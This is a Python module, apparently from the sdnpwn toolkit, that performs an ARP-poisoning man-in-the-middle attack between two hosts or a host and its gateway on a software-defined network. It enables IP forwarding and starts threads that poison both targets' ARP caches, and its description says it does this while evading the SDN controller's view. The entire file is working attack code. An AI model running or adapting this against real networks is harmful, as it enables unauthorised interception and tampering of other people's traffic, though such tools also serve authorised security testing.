
from scapy.all import *
import sys
import signal
from time import sleep
from threading import Thread
import netifaces
import subprocess as sp

import modules.sdnpwn.sdnpwn_common as sdnpwn
import modules.Attack.dp_arp_poison as dpap

def info():
  return "Performs a MitM attack against two devices without poisoning the controllers view of the network."
  
def usage():
  
  sdnpwn.addUsage("--iface", "Interface to use", True)
  sdnpwn.addUsage("--target1", "IP address for first target", True)
  sdnpwn.addUsage("--target1-mac", "MAC address for first target")
  sdnpwn.addUsage("--gateway", "Use network gateway as second target")
  sdnpwn.addUsage("--target2", "IP address for  second target (Required without -g option)")
  sdnpwn.addUsage("--target2-mac", "MAC address for second target")
  
  return sdnpwn.getUsage()
  
def ipForwarding(val):
  ipf = open('/proc/sys/net/ipv4/ip_forward', 'w')
  ipf.write(str(val) + "\n")

def signal_handler(signal, frame):
  global runningThreads
  sdnpwn.message("Stopping...", sdnpwn.NORMAL)
  dpap.stopPoisoning()
  while(dpap.isPoisoningComplete() != True):
    pass
  runningThreads.remove(runningThreads[1])
  runningThreads.remove(runningThreads[0]) 
  
def run(params): 
  global runningThreads
  
  runningThreads = []
  
  conf.verb = 0
  
  signal.signal(signal.SIGINT, signal_handler)

  interface = None
  target1IP = None
  target1MAC = None
  target2IP = None
  target2MAC = None
  
  if("--iface" in params):
    interface = params[params.index("--iface")+1]
  else:
    print(info())
    print(usage())
    return
  if("--target1" in params):
    target1IP = params[params.index("--target1")+1]
  if("--target1-mac" in params):
    target1MAC = params[params.index("--target1-mac")+1]
  else:
    target1MAC = sdnpwn.getTargetMacAddress(interface, target1IP)

  if(interface == None or target1IP == None or target1MAC == None):
    print(info())
    print(usage())
    return

  if("--gateway" not in params):
    if("--target2" in params):
      target2IP = params[params.index("--target2")+1]
    if("--target2-mac" in params):
      target2MAC = params[params.index("--target2-mac")+1]
    else:
      target2MAC = sdnpwn.getTargetMacAddress(interface, target2IP)
  else:
    target2IP = netifaces.gateways()['default'][netifaces.AF_INET][0]
    target2MAC = sdnpwn.getTargetMacAddress(interface, target2IP) #getMacFromARPTable(target2IP)
    if(target2MAC == ""):
      sdnpwn.message("Could not get gateway MAC address", sdnpwn.ERROR)
      return
      
  if(target1IP == None or target1MAC == None or target2IP == None or target2MAC == None):
    print(info())
    print(usage())
    return
    
  thisHostIP = sdnpwn.getIPAddress(interface)
  thisHostMAC = sdnpwn.getMacAddress(interface)
  
  if((thisHostIP == '0') or (thisHostMAC == '0')):
    sdnpwn.message("Invalid interface", sdnpwn.ERROR)
    exit(0)
    
  sdnpwn.message("Enabling IP Forwarding", sdnpwn.NORMAL)
  ipForwarding(1)
  
  p1 = Thread(target=dpap.arpCachePoison, args=(interface, target1IP, target1MAC, target2IP, thisHostMAC, thisHostIP, thisHostMAC, True, 1))
  p2 = Thread(target=dpap.arpCachePoison, args=(interface, target2IP, target2MAC, target1IP, thisHostMAC, thisHostIP, thisHostMAC, True, 1))
  p1.setDaemon(True)
  p2.setDaemon(True)
  runningThreads.append(p1)
  runningThreads.append(p2)
  p1.start()
  p2.start()
  
  sdnpwn.message("Press Ctrl+C to stop...", sdnpwn.NORMAL)
  
  while(len(runningThreads) != 0):
    pass
  
  
